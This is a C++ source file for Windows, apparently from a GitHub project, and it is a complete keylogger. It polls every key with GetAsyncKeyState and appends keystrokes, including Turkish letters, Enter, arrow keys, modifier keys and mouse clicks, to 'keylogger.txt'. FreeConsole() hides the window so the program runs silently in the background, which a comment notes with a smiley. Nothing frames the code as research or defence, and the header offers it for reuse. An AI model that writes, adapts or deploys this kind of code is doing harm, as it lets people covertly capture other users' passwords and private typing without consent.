/*
    This software is owned by Mehmet Tezel.
    You can change and use as you wish.
    (Provided that the source is specified)
    https://github.com/TzLcorp

    TezeL Corporation
*/

#include <iostream>
#include <string>
#include <clocale>
#include <stdio.h>
#include <stdlib.h>
#include <conio.h>
#include <windows.h>

using namespace std;

int x2 = 0, y2 = 0; // Cursor
char		keys[256];
int check;

void gotoxy(int x, int y) // Cursor function (old library function)
{
	COORD coord;
	coord.X = x;
	coord.Y = y;

	SetConsoleCursorPosition(GetStdHandle(STD_OUTPUT_HANDLE), coord);
}

void hideCursor() // Hides cursor for console
{
	HANDLE out = GetStdHandle(STD_OUTPUT_HANDLE);

	CONSOLE_CURSOR_INFO     cursorInfo;

	GetConsoleCursorInfo(out, &cursorInfo);
	cursorInfo.bVisible = false;
	SetConsoleCursorInfo(out, &cursorInfo);
}

int checkKeyboard(char keys[], char* file) // Checks keyboard keys
{
    for (int a = 0; a < 256; a++)
    {
        keys[a] = (char)(GetAsyncKeyState(a) & 0x0001); // >> 8
    }
    FILE* OUTPUT_FILE; // creating new file variable

    OUTPUT_FILE = fopen(file, "a+"); // creating new file

    // KEYS

	if (keys['A'] != 0)
	{
	    if((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
        {
            fprintf(OUTPUT_FILE, "%s", "A");
            cout << 'A';
            x2++;
        }
        else
        {
            fprintf(OUTPUT_FILE, "%s", "a");
            cout << 'a';
            x2++;
        }
	}
	else if (keys['B'] != 0)
    {
        if((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
        {
            fprintf(OUTPUT_FILE, "%s", "B");
            cout << 'B';
            x2++;
        }
        else
        {
            fprintf(OUTPUT_FILE, "%s", "b");
            cout << 'b';
            x2++;
        }
    }
    else if (keys['C'] != 0)
    {
        if((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
        {
            fprintf(OUTPUT_FILE, "%s", "C");
            cout << 'C';
            x2++;
        }
        else
        {
            fprintf(OUTPUT_FILE, "%s", "c");
            cout << 'c';
            x2++;
        }
    }
    else if (keys['D'] != 0)
    {
        if((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
        {
            fprintf(OUTPUT_FILE, "%s", "D");
            cout << 'D';
            x2++;
        }
        else
        {
            fprintf(OUTPUT_FILE, "%s", "d");
            cout << 'd';
            x2++;
        }
    }
    else if (keys['E'] != 0)
    {
        if((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
        {
            fprintf(OUTPUT_FILE, "%s", "E");
            cout << 'E';
            x2++;
        }
        else
        {
            fprintf(OUTPUT_FILE, "%s", "e");
            cout << 'e';
            x2++;
        }
    }
    else if (keys['F'] != 0)
    {
        if((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
        {
            fprintf(OUTPUT_FILE, "%s", "F");
            cout << 'F';
            x2++;
        }
        else
        {
            fprintf(OUTPUT_FILE, "%s", "f");
            cout << 'f';
            x2++;
        }
    }
    else if (keys['G'] != 0)
    {
        if((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
        {
            fprintf(OUTPUT_FILE, "%s", "G");
            cout << 'G';
            x2++;
        }
        else
        {
            fprintf(OUTPUT_FILE, "%s", "g");
            cout << 'g';
            x2++;
        }
    }
    else if (keys['H'] != 0)
    {
        if((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
        {
            fprintf(OUTPUT_FILE, "%s", "H");
            cout << 'H';
            x2++;
        }
        else
        {
            fprintf(OUTPUT_FILE, "%s", "h");
            cout << 'h';
            x2++;
        }
    }
    else if (keys['I'] != 0)
    {
        if((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
        {
            fprintf(OUTPUT_FILE, "%s", "I");
            cout << 'I';
            x2++;
        }
        else
        {
            fprintf(OUTPUT_FILE, "%s", "ý");
            cout << 'ý';
            x2++;
        }
    }
    else if (keys['J'] != 0)
    {
        if((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
        {
            fprintf(OUTPUT_FILE, "%s", "J");
            cout << 'J';
            x2++;
        }
        else
        {
            fprintf(OUTPUT_FILE, "%s", "j");
            cout << 'j';
            x2++;
        }
    }
    else if (keys['K'] != 0)
    {
        if((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
        {
            fprintf(OUTPUT_FILE, "%s", "K");
            cout << 'K';
            x2++;
        }
        else
        {
            fprintf(OUTPUT_FILE, "%s", "k");
            cout << 'k';
            x2++;
        }
    }
    else if (keys['L'] != 0)
    {
        if((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
        {
            fprintf(OUTPUT_FILE, "%s", "L");
            cout << 'L';
            x2++;
        }
        else
        {
            fprintf(OUTPUT_FILE, "%s", "l");
            cout << 'l';
            x2++;
        }
    }
    else if (keys['M'] != 0)
    {
        if((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
        {
            fprintf(OUTPUT_FILE, "%s", "M");
            cout << 'M';
            x2++;
        }
        else
        {
            fprintf(OUTPUT_FILE, "%s", "m");
            cout << 'm';
            x2++;
        }
    }
    else if (keys['N'] != 0)
    {
        if((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
        {
            fprintf(OUTPUT_FILE, "%s", "N");
            cout << 'N';
            x2++;
        }
        else
        {
            fprintf(OUTPUT_FILE, "%s", "n");
            cout << 'n';
            x2++;
        }
    }
    else if (keys['O'] != 0)
    {
        if((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
        {
            fprintf(OUTPUT_FILE, "%s", "O");
            cout << 'O';
            x2++;
        }
        else
        {
            fprintf(OUTPUT_FILE, "%s", "o");
            cout << 'o';
            x2++;
        }
    }
    else if (keys['P'] != 0)
    {
        if((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
        {
            fprintf(OUTPUT_FILE, "%s", "P");
            cout << 'P';
            x2++;
        }
        else
        {
            fprintf(OUTPUT_FILE, "%s", "p");
            cout << 'p';
            x2++;
        }
    }
    else if (keys['R'] != 0)
    {
        if((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
        {
            fprintf(OUTPUT_FILE, "%s", "R");
            cout << 'R';
            x2++;
        }
        else
        {
            fprintf(OUTPUT_FILE, "%s", "r");
            cout << 'r';
            x2++;
        }
    }
    else if (keys['S'] != 0)
    {
        if((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
        {
            fprintf(OUTPUT_FILE, "%s", "S");
            cout << 'S';
            x2++;
        }
        else
        {
            fprintf(OUTPUT_FILE, "%s", "s");
            cout << 's';
            x2++;
        }
    }
    else if (keys['T'] != 0)
    {
        if((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
        {
            fprintf(OUTPUT_FILE, "%s", "T");
            cout << 'T';
            x2++;
        }
        else
        {
            fprintf(OUTPUT_FILE, "%s", "t");
            cout << 't';
            x2++;
        }
    }
    else if (keys['U'] != 0)
    {
        if((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
        {
            fprintf(OUTPUT_FILE, "%s", "U");
            cout << 'U';
            x2++;
        }
        else
        {
            fprintf(OUTPUT_FILE, "%s", "u");
            cout << 'u';
            x2++;
        }
    }
    else if (keys['V'] != 0)
    {
        if((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
        {
            fprintf(OUTPUT_FILE, "%s", "V");
            cout << 'V';
            x2++;
        }
        else
        {
            fprintf(OUTPUT_FILE, "%s", "v");
            cout << 'v';
            x2++;
        }
    }
    else if (keys['Y'] != 0)
    {
        if((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
        {
            fprintf(OUTPUT_FILE, "%s", "Y");
            cout << 'Y';
            x2++;
        }
        else
        {
            fprintf(OUTPUT_FILE, "%s", "y");
            cout << 'y';
            x2++;
        }
    }
    else if (keys['Z'] != 0)
    {
        if((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
        {
            fprintf(OUTPUT_FILE, "%s", "Z");
            cout << 'Z';
            x2++;
        }
        else
        {
            fprintf(OUTPUT_FILE, "%s", "z");
            cout << 'z';
            x2++;
        }
    }
    else if (keys['Q'] != 0)
    {
        if((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
        {
            fprintf(OUTPUT_FILE, "%s", "Q");
            cout << 'Q';
            x2++;
        }
        else
        {
            fprintf(OUTPUT_FILE, "%s", "q");
            cout << 'q';
            x2++;
        }
    }
    else if (keys['W'] != 0)
    {
        if((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
        {
            fprintf(OUTPUT_FILE, "%s", "W");
            cout << 'W';
            x2++;
        }
        else
        {
            fprintf(OUTPUT_FILE, "%s", "w");
            cout << 'w';
            x2++;
        }
    }
    else if (keys['X'] != 0)
    {
        if((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
        {
            fprintf(OUTPUT_FILE, "%s", "X");
            cout << 'X';
            x2++;
        }
        else
        {
            fprintf(OUTPUT_FILE, "%s", "x");
            cout << 'x';
            x2++;
        }
    }
    else if (keys[VK_OEM_2] != 0)
    {
        if((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
        {
            fprintf(OUTPUT_FILE, "%s", "Ö");
            cout << 'Ö';
            x2++;
        }
        else
        {
            fprintf(OUTPUT_FILE, "%s", "ö");
            cout << 'ö';
            x2++;
        }
    }
    else if (keys[VK_OEM_5] != 0)
    {
        if((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
        {
            fprintf(OUTPUT_FILE, "%s", "Ç");
            cout << 'Ç';
            x2++;
        }
        else
        {
            fprintf(OUTPUT_FILE, "%s", "ç");
            cout << 'ç';
            x2++;
        }
    }
    else if (keys[VK_OEM_7] != 0)
    {
        if((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
        {
            fprintf(OUTPUT_FILE, "%s", "Ý");
            cout << 'Ý';
            x2++;
        }
        else
        {
            fprintf(OUTPUT_FILE, "%s", "i");
            cout << 'i';
            x2++;
        }
    }
    else if (keys[VK_OEM_1] != 0)
    {
        if((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
        {
            fprintf(OUTPUT_FILE, "%s", "Þ");
            cout << 'Þ';
            x2++;
        }
        else
        {
            fprintf(OUTPUT_FILE, "%s", "þ");
            cout << 'þ';
            x2++;
        }
    }
    else if (keys[VK_OEM_6] != 0)
    {
        if((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
        {
            fprintf(OUTPUT_FILE, "%s", "Ü");
            cout << 'Ü';
            x2++;
        }
        else
        {
            fprintf(OUTPUT_FILE, "%s", "ü");
            cout << 'ü';
            x2++;
        }
    }
    else if (keys[VK_OEM_4] != 0)
    {
        if((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
        {
            fprintf(OUTPUT_FILE, "%s", "Ð");
            cout << 'Ð';
            x2++;
        }
        else
        {
            fprintf(OUTPUT_FILE, "%s", "ð");
            cout << 'ð';
            x2++;
        }
    }
    else if (keys[0xBE] != 0)
    {
        if((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
        {
            fprintf(OUTPUT_FILE, "%s", ".");
            cout << '.';
            x2++;
        }
        else
        {
            fprintf(OUTPUT_FILE, "%s", ".");
            cout << '.';
            x2++;
        }
    }
    else if (keys[0xBC] != 0)
    {
        if((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
        {
            fprintf(OUTPUT_FILE, "%s", ",");
            cout << ',';
            x2++;
        }
        else
        {
            fprintf(OUTPUT_FILE, "%s", ",");
            cout << ',';
            x2++;
        }
    }
    else if (keys[VK_SPACE] != 0)
    {
        if((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
        {
            fprintf(OUTPUT_FILE, "%s", " ");
            x2++;
        }
        else
        {
            fprintf(OUTPUT_FILE, "%s", " ");
            x2++;
        }
    }
    else if (keys[VK_RETURN] != 0)
    {
        if((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
        {
            fprintf(OUTPUT_FILE, "%s", "[ENTER]");
            cout << endl;
            y2++;
        }
        else
        {
            fprintf(OUTPUT_FILE, "%s", "[ENTER]");
            cout << endl;
            y2++;
        }
    }
    else if(keys[VK_BACK] != 0)
    {
        // fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]"); Don't use this because it writes too much to the file.
        // Sleep(50); Solves backspace issue printed in a row
        cout << "\b ";
        x2--;
    }
    else if (keys[VK_DELETE] & 0x0001 != 0)
    {
        fprintf(OUTPUT_FILE, "%s", "[DELETE]");
        x2++;
        cout << " \b";
    }
    else if(keys[VK_UP] != 0)
    {
        fprintf(OUTPUT_FILE, "%s", "[UP]");
        y2--;
    }
    else if(keys[VK_DOWN] != 0)
    {
        fprintf(OUTPUT_FILE, "%s", "[DOWN]");
        y2++;
    }
    else if(keys[VK_LEFT] != 0)
    {
        fprintf(OUTPUT_FILE, "%s", "[LEFT]");
        x2--;
    }
    else if(keys[VK_RIGHT] != 0)
    {
        fprintf(OUTPUT_FILE, "%s", "[RIGHT]");
        x2++;
    }
    else if(keys[VK_MENU] != 0)
    {
        fprintf(OUTPUT_FILE, "%s", "[ALT]");
    }
    else if(keys[VK_CONTROL] != 0)
    {
        fprintf(OUTPUT_FILE, "%s", "[CTRL]");
    }
    else if(keys[VK_SNAPSHOT] != 0)
    {
        fprintf(OUTPUT_FILE, "%s", "[PRINTSCREEN]");
    }
    else if(keys[VK_TAB] != 0)
    {
        fprintf(OUTPUT_FILE, "%s", "[TAB]");
    }
    else if(keys[VK_CAPITAL] != 0)
    {
        fprintf(OUTPUT_FILE, "%s", "[CAPSLOCK]");
    }
    else if(keys[VK_SHIFT] != 0)
    {
        fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
    }
    else if(keys[VK_ESCAPE] != 0)
    {
        fprintf(OUTPUT_FILE, "%s", "[ESC]");
    }
    else if(keys[VK_LBUTTON] != 0)
    {
        fprintf(OUTPUT_FILE, "%s", "[LEFT CLICK]");
    }
    else if(keys[VK_RBUTTON] != 0)
    {
        fprintf(OUTPUT_FILE, "%s", "[RIGHT CLICK]");
    }
    else if(keys[VK_NUMPAD0] != 0)
    {
        fprintf(OUTPUT_FILE, "%s", "0");
        cout << '0';
        x2++;
    }
    else if(keys[VK_NUMPAD1] != 0)
    {
        fprintf(OUTPUT_FILE, "%s", "1");
        cout << '1';
        x2++;
    }
    else if(keys[VK_NUMPAD2] != 0)
    {
        fprintf(OUTPUT_FILE, "%s", "2");
        cout << '2';
        x2++;
    }
    else if(keys[VK_NUMPAD3] != 0)
    {
        fprintf(OUTPUT_FILE, "%s", "3");
        cout << '3';
        x2++;
    }
    else if(keys[VK_NUMPAD4] != 0)
    {
        fprintf(OUTPUT_FILE, "%s", "4");
        cout << '4';
        x2++;
    }
    else if(keys[VK_NUMPAD5] != 0)
    {
        fprintf(OUTPUT_FILE, "%s", "5");
        cout << '5';
        x2++;
    }
    else if(keys[VK_NUMPAD6] != 0)
    {
        fprintf(OUTPUT_FILE, "%s", "6");
        cout << '6';
        x2++;
    }
    else if(keys[VK_NUMPAD7] != 0)
    {
        fprintf(OUTPUT_FILE, "%s", "7");
        cout << '7';
        x2++;
    }
    else if(keys[VK_NUMPAD8] != 0)
    {
        fprintf(OUTPUT_FILE, "%s", "8");
        cout << '8';
        x2++;
    }
    else if(keys[VK_NUMPAD9] != 0)
    {
        fprintf(OUTPUT_FILE, "%s", "9");
        cout << '9';
        x2++;
    }
    else if(keys[0x30] != 0)
    {
        fprintf(OUTPUT_FILE, "%s", "0");
        cout << '0';
        x2++;
    }
    else if(keys[0x31] != 0)
    {
        fprintf(OUTPUT_FILE, "%s", "1");
        cout << '1';
        x2++;
    }
    else if(keys[0x32] != 0)
    {
        fprintf(OUTPUT_FILE, "%s", "2");
        cout << '2';
        x2++;
    }
    else if(keys[0x33] != 0)
    {
        fprintf(OUTPUT_FILE, "%s", "3");
        cout << '3';
        x2++;
    }
    else if(keys[0x34] != 0)
    {
        fprintf(OUTPUT_FILE, "%s", "4");
        cout << '4';
        x2++;
    }
    else if(keys[0x35] != 0)
    {
        fprintf(OUTPUT_FILE, "%s", "5");
        cout << '5';
        x2++;
    }
    else if(keys[0x36] != 0)
    {
        fprintf(OUTPUT_FILE, "%s", "6");
        cout << '6';
        x2++;
    }
    else if(keys[0x37] != 0)
    {
        fprintf(OUTPUT_FILE, "%s", "7");
        cout << '7';
        x2++;
    }
    else if(keys[0x38] != 0)
    {
        fprintf(OUTPUT_FILE, "%s", "8");
        cout << '8';
        x2++;
    }
    else if(keys[0x39] != 0)
    {
        fprintf(OUTPUT_FILE, "%s", "9");
        cout << '9';
        x2++;
    }
    fclose(OUTPUT_FILE); // Here we close the file, but don't worry, the file will continue to run in the background :)

    return 0;
}

int main(){

    setlocale(LC_ALL, ""); /* It supports all characters,
    but you need to add those keys to
    the above functions in what
    language you want it to work in.
    For now, only Turkish and English are available */

    FreeConsole(); // Hides console, if you don't want to use this function, the keys pressed will appear on the console. (some)
    char i;
    while (true)
	{
	    hideCursor();
		for(i = 8; i <= 256; i++)
        {
            gotoxy(x2, y2); // cursor
            checkKeyboard(keys,"keylogger.txt"); // You can change the file name if you want
        }
	}

    return 0;
}
